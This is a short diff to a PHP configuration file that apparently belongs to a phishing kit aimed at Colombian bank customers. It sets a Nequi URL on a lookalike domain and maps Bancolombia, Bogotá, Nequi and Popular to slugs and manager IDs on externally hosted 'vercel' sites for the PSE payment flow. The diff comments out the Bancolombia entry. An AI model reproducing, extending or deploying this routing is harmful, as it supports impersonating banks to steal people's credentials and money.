@@ -21,7 +21,7 @@ define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#
 
 // Bancos existentes → vercel (/sites/{slug}/manager/{id})
 $PSE_BANKS = [
-    'bancolombia' => ['slug' => 'bc', 'id' => '5342f229df47492baebe7f3e'],
+    // 'bancolombia' => ['slug' => 'bc', 'id' => '5342f229df47492baebe7f3e'],
     'bogota' => ['slug' => 'bg', 'id' => '5342f229df47492baebe7f3e'],
     'nequi' => ['slug' => 'nq', 'id' => '5342f229df47492baebe7f3e'],
     'popular' => ['slug' => 'pop', 'id' => '5342f229df47492baebe7f3e'],
